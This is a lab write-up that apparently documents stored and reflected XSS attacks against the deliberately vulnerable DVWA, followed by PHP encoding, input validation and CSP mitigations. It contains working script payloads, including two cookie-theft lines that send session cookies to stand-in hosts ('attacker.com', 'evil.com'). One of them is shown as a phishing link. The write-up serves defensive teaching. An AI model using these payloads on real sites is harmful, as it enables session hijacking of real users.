# XSS — Attack & Mitigation Scenarios

**Target:** DVWA (Damn Vulnerable Web Application)  
**Vulnerabilities:** Stored XSS, Reflected XSS  
**Severity:** High

---

## Scenario 1: Stored XSS

### Attack

Navigate to DVWA Stored XSS page:

```
http://localhost/DVWA/vulnerabilities/xss_s/
```

Submit a malicious script in the name field:

```html
Name: <script>alert('Stored XSS by Pranesh')</script>
Message: This is a test message
```

**Result:** The script is stored in the database. Every user who views the guestbook page sees the alert popup.

### Advanced Payload — Cookie Theft

```html
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

**Impact:** Attacker steals session cookies, enabling session hijacking.

### Mitigation

**Input sanitization:**
```php
$name = strip_tags($_POST['txtName']);
$message = htmlspecialchars($_POST['mtxMessage'], ENT_QUOTES, 'UTF-8');
```

**Output encoding:**
```php
echo htmlspecialchars($row['name'], ENT_QUOTES, 'UTF-8');
```

**Content Security Policy:**
```apache
Header set Content-Security-Policy "default-src 'self'; script-src 'self'"
```

With CSP enabled, inline `<script>` tags are blocked by the browser.

---

## Scenario 2: Reflected XSS

### Attack

Navigate to DVWA Reflected XSS page:

```
http://localhost/DVWA/vulnerabilities/xss_r/?name=<script>alert('Reflected XSS')</script>
```

**Result:** The script in the URL parameter is reflected in the page response and executes immediately.

### Social Engineering Vector

Attacker sends victim a link:

```
http://bank.com/search?q=<script>
  document.location='http://evil.com/phish?cookie='+document.cookie
</script>
```

Victim clicks → script executes → session stolen.

### Mitigation

**Input validation:**
```php
$name = $_GET['name'];
if (!preg_match('/^[a-zA-Z0-9 ]+$/', $name)) {
    die('Invalid input');
}
```

**Output encoding:**
```php
echo "Hello " . htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
```

**CSP header blocks inline scripts even if encoding fails.**

---

## Before vs After Comparison

| Test | Without Protection | With Protection |
|------|-------------------|-----------------|
| `<script>alert(1)</script>` in name field | Executes | Stripped/encoded |
| Script in URL parameter | Reflected and executes | Encoded, displayed as text |
| Cookie theft payload | Session hijacked | Blocked by CSP |
| securityheaders.com grade | F | A/B with CSP |

---

## Key Takeaways

- Never trust user input — validate and encode everything
- Use Content Security Policy as a defense-in-depth layer
- HTTP-only cookies prevent JavaScript cookie access
- Modern frameworks auto-escape output by default
